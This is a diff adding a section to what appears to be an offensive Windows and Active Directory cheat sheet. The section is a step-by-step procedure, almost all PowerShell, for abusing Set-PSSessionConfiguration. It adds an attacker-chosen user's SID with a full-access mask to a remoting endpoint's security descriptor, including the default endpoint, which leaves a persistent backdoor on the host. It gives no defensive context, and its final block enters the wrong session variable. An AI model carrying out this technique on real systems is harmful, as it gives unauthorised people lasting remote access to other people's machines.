@@ -293,7 +293,59 @@ Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,
 New-ScheduledTask, Register-ScheduledJob
 ```
 
+### Abuse - Set-PSSessionConfiguration
+- From https://github.com/samratashok/RACE/blob/master/RACE.ps1
+- After finding a profile to edit, can also edit `microsoft.powershell` which is the normal remoting endpoint!
 
+#### Connect and check the config
+```
+$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
+Enter-PSSession $sess
+Get-PSSessionConfiguration
+```
+
+#### Get original SDDL
+```
+$existingSDDL = (Get-PSSessionConfiguration -Name "<PROFILE>" -Verbose:$false).SecurityDescriptorSDDL
+```
+
+#### Get SID  for new user to add
+```
+$SID = (Get-DomainUser <USER>).Objectsid
+```
+
+#### Create new SDDL with a new USER SID
+```
+$isContainer = $false  
+$isDS = $false  
+$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL
+$accessType = "Allow"  
+$accessMask = 268435456  
+$inheritanceFlags = "none"  
+$propagationFlags = "none"  
+$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null
+$newSDDL = $SecurityDescriptor.GetSddlForm("All")
+$newSDDL
+```
+
+#### Change the config
+````
+Set-PSSessionConfiguration -name "<PROFILE>" -SecurityDescriptorSddl "<SDDL>" -force -Confirm:$false
+````
+
+#### Reconnect and check the config
+```
+$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
+Enter-PSSession $sess
+Get-PSSessionConfiguration
+```
+
+#### Connect to reconfigured new endpoint
+```
+$sess2 = New-PSSession -ComputerName <FQDN> -Credential $creds2 -ConfigurationName <RECONFIGURED ENDPOINT>
+Enter-PSSession $sess
+Get-PSSessionConfiguration
+```
 
 ## Windows Defender
 #### Check if windows defender is running
